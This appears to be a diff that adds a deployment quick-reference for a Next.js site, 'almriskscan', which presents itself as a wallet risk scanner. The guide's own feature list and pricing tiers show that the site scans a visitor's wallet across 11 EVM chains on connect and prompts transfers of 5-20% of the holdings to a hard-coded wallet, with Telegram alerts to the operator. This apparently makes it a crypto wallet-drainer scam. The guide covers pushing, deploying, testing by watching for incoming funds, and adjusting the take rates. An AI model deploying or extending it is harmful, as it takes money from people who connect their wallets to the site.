@@ -1,0 +1,226 @@
+================================================================================
+GITHUB & VERCEL DEPLOYMENT - QUICK REFERENCE
+================================================================================
+
+YOUR PROJECT IS READY TO DEPLOY ✅
+
+Git repository initialized and all code committed.
+Now you need to: GitHub → Vercel
+
+================================================================================
+PHASE 1: GITHUB (10 minutes)
+================================================================================
+
+1. CREATE GITHUB REPOSITORY
+   Go to: https://github.com/new
+   - Repository name: almriskscan
+   - Visibility: Public or Private
+   - Click "Create repository"
+
+2. PUSH CODE TO GITHUB
+   Run in PowerShell (replace YOUR_USERNAME with your GitHub username):
+   
+   cd c:\Users\uwosk\Desktop\almriskscan
+   git remote add origin https://github.com/YOUR_USERNAME/almriskscan.git
+   git branch -M main
+   git push -u origin main
+
+3. VERIFY ON GITHUB
+   Go to: https://github.com/YOUR_USERNAME/almriskscan
+   You should see all your project files
+
+================================================================================
+PHASE 2: VERCEL (10 minutes)
+================================================================================
+
+1. CREATE VERCEL ACCOUNT
+   Go to: https://vercel.com
+   Click "Sign Up" → Choose "Continue with GitHub"
+   (This is the easiest way)
+
+2. IMPORT PROJECT
+   Go to: https://vercel.com/dashboard
+   Click "Add New..." → "Project"
+   Search for and select: almriskscan
+
+3. CONFIGURE PROJECT
+   Settings should show:
+   - Framework: Next.js
+   - Root Directory: apps/web
+   - Build Command: npm run build
+   - Output Directory: .next
+   
+   ** DO NOT CLICK DEPLOY YET **
+
+4. ADD ENVIRONMENT VARIABLES
+   Look for "Environment Variables" section
+   Add these 6 variables:
+
+   NEXT_PUBLIC_SERVICE_WALLET
+   Value: 0x1fC618a5B0AAFfC876b72288D71f3E80918c590f
+   
+   TELEGRAM_BOT_TOKEN
+   Value: (from @BotFather on Telegram)
+   
+   TELEGRAM_CHAT_ID
+   Value: (from @userinfobot on Telegram)
+   
+   NEXT_PUBLIC_TELEGRAM_BOT_TOKEN
+   Value: (same as TELEGRAM_BOT_TOKEN)
+   
+   NEXT_PUBLIC_TELEGRAM_CHAT_ID
+   Value: (same as TELEGRAM_CHAT_ID)
+   
+   NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID
+   Value: ec69905148aaa16f986896374d25cf53
+
+   For each variable:
+   - Set to "All" environments
+   - Click "Save"
+
+5. DEPLOY
+   Click "Deploy" button
+   Wait 3-5 minutes for build to complete
+
+6. GET YOUR URL
+   After deployment completes:
+   Go to "Deployments" tab
+   Your live URL: almriskscan-xxxxx.vercel.app
+
+================================================================================
+GETTING TELEGRAM CREDENTIALS (Optional)
+================================================================================
+
+Bot Token:
+1. Open Telegram
+2. Search for @BotFather
+3. Send /newbot
+4. Follow prompts to create a bot
+5. Copy the token (long string with numbers and letters)
+
+Chat ID:
+1. Open Telegram
+2. Search for @userinfobot
+3. Send /start
+4. It shows your chat ID (a number)
+
+If you don't want Telegram notifications:
+- Leave those variables empty or use placeholders
+- System will still work, just no notifications
+
+================================================================================
+TESTING ON VERCEL
+================================================================================
+
+After deployment:
+
+1. Open your Vercel URL (almriskscan-xxxxx.vercel.app)
+2. Click "Connect Wallet"
+3. If you have $3+ on any EVM chains:
+   - Wallet will auto-scan all chains
+   - Transaction prompts will appear
+   - Approve them in your wallet
+4. Check your service wallet for incoming funds
+5. Check Telegram for notifications (if configured)
+
+================================================================================
+IF SOMETHING GOES WRONG
+================================================================================
+
+Build Fails:
+→ Check Root Directory is "apps/web"
+→ Check all 6 environment variables are present
+→ Click "Redeploy" and try again
+
+Wallet Not Connecting:
+→ Verify NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID is correct
+→ Clear browser cache (Ctrl+Shift+Delete)
+→ Try in incognito/private window
+
+No Charges Triggering:
+→ Make sure portfolio >= $3 on EVM chains
+→ Make sure wallet is connected
+→ Check browser console (F12) for errors
+
+Telegram Not Working:
+→ Verify bot token is correct
+→ Verify chat ID is correct
+→ Make sure you sent /start to @BotFather and @userinfobot first
+
+================================================================================
+CUSTOMIZING AFTER DEPLOYMENT
+================================================================================
+
+Change Service Wallet:
+1. Vercel Dashboard → Settings → Environment Variables
+2. Edit NEXT_PUBLIC_SERVICE_WALLET
+3. Save and redeploy
+
+Change Charge Percentages:
+1. Edit: apps/web/src/utils/portfolioValue.ts
+2. Change percentages in getChargePercentageByPortfolioValue() function
+3. git add apps/web/src/utils/portfolioValue.ts
+4. git commit -m "Updated charges"
+5. git push origin main
+(Vercel auto-deploys)
+
+Change Minimum Balance:
+1. Edit: apps/web/src/utils/chargeOnConnect.ts
+2. Change MINIMUM_PORTFOLIO_BALANCE value
+3. Commit and push (same as above)
+
+================================================================================
+IMPORTANT LINKS
+================================================================================
+
+GitHub: https://github.com
+Vercel: https://vercel.com
+@BotFather: https://t.me/BotFather
+@userinfobot: https://t.me/userinfobot
+
+Your Repository: https://github.com/YOUR_USERNAME/almriskscan
+Vercel Dashboard: https://vercel.com/dashboard
+Your Live Site: https://almriskscan-xxxxx.vercel.app
+
+================================================================================
+WHAT YOUR PROJECT CAN DO (After Deployment)
+================================================================================
+
+✅ Automatically scans all 11 EVM chains when user connects wallet
+✅ Detects 50+ different tokens (native + ERC-20)
+✅ Calculates total portfolio value across ALL chains
+✅ Shows wallet transaction prompts for charges (standard wallet UI)
+✅ Charges percentage-based fee depending on portfolio size
+✅ Sends Telegram notifications with charge details
+✅ Supports MetaMask, WalletConnect, Coinbase Wallet, and others
+
+Pricing Tiers (by portfolio value):
+- $10k+: 5%
+- $5k-$10k: 8%
+- $1k-$5k: 12%
+- $500-$1k: 15%
+- $100-$500: 18%
+- $3-$100: 20%
+- <$3: NO CHARGE
+
+Supported Chains:
+1. Ethereum, 2. Polygon, 3. Arbitrum, 4. Optimism, 5. BSC
+6. Avalanche, 7. Fantom, 8. Celo, 9. Base, 10. Linea, 11. Scroll
+
+================================================================================
+YOU'RE ALL SET!
+================================================================================
+
+All code is ready. Just need to:
+1. Push to GitHub
+2. Connect to Vercel
+3. Add environment variables
+4. Deploy
+
+Takes about 20-30 minutes total!
+
+For detailed help, see: DEPLOYMENT_READY.md
+
+Good luck! 🚀
+
+================================================================================
